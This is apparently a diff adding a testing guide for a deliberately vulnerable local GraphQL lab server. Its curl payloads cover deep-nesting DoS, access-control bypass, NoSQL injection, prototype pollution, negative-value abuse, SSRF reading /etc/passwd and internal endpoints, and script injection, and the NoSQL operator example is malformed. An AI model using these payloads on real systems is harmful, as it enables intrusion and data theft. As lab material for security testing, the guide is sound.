@@ -1,0 +1,157 @@
+GraphQL Security Vulnerabilities Testing Guide
+===========================================
+
+Prerequisites:
+-------------
+1. Start the server
+2. Create two test users (user1 and user2)
+3. Keep both user tokens handy
+
+1. DoS (N+1 Query) Vulnerability
+-------------------------------
+# Test recursive query depth exploitation
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "query { getFriends { id name friends { id name friends { id name friends { id name friends { id name } } } } } }"
+}'
+
+2. Access Control (ACL) Vulnerabilities
+------------------------------------
+# Create private note as User1
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { createNote(title: \"Private Note\", content: \"Secret content\", isPrivate: true) { id title content } }"
+}'
+
+# Try to access private note without authentication
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { getNoteById(id: \"NOTE_ID\") { id title content isPrivate owner { email } } }"
+}'
+
+# Access all notes as User2
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER2_TOKEN" \
+-d '{
+  "query": "query { getAllNotes { id title content isPrivate owner { email } } }"
+}'
+
+# Update someone else's note
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER2_TOKEN" \
+-d '{
+  "query": "mutation { updateNote(id: \"NOTE_ID\", content: \"Hacked content\") { id title content } }"
+}'
+
+3. NoSQL Injection Vulnerabilities
+-------------------------------
+# Create test user with specific role
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "mutation { signUp(input: { email: \"test@test.com\", password: \"password123\", role: \"USER\" }) { token } }"
+}'
+
+# Test regex injection
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { searchUsers(query: \".*\") { id email name } }"
+}'
+
+# Test NoSQL operator injection
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { findUsersByRole(roleFilter: \"\", $ne: null\") { id email role } }"
+}'
+
+4. Input Validation Vulnerabilities
+--------------------------------
+# Create product with valid data
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { createProduct(name: \"Test Product\", price: 100, description: \"Test Description\") { id name price } }"
+}'
+
+# Test negative price
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { updateProduct(id: \"PRODUCT_ID\", price: -999) { id name price } }"
+}'
+
+# Create order with negative quantity
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { createOrder(input: { items: [{ id: \"PRODUCT_ID\", quantity: -10, customPrice: -100 }], status: \"PENDING\" }) { id totalAmount } }"
+}'
+
+# Inject malicious metadata
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { createOrder(input: { items: [{ id: \"PRODUCT_ID\", quantity: 1 }], metadata: { \"__proto__\": { \"isAdmin\": true } } }) { id } }"
+}'
+
+5. SSRF Vulnerabilities
+---------------------
+# Test external resource fetch
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { fetchExternalResource(url: \"https://api.github.com\") { content status } }"
+}'
+
+# Test local file access
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { fetchExternalResource(url: \"file:///etc/passwd\") { content status } }"
+}'
+
+# Test internal network access
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-d '{
+  "query": "query { fetchExternalResource(url: \"http://localhost:3000/internal/config\") { content status } }"
+}'
+
+6. Schema Validation Bypass
+------------------------
+# Test invalid status
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { updateOrderStatus(id: \"ORDER_ID\", status: \"<script>alert(1)</script>\") { id status } }"
+}'
+
+# Test bulk operations with invalid data
+curl -X POST http://localhost:4000/graphql \
+-H "Content-Type: application/json" \
+-H "Authorization: Bearer USER1_TOKEN" \
+-d '{
+  "query": "mutation { bulkCreateOrders(orders: [{ items: [{ id: \"PRODUCT_ID\", quantity: 999999999 }] }, { items: [{ id: \"PRODUCT_ID\", quantity: -1 }] }]) { id totalAmount } }"
+}'
+
+Notes:
+------
+1. Replace USER1_TOKEN, USER2_TOKEN with actual JWT tokens
+2. Replace PRODUCT_ID, ORDER_ID, NOTE_ID with actual IDs from your database
+3. Some vulnerabilities might be environment-specific
+4. All examples are for educational purposes only
+5. Always test in a safe, isolated environment
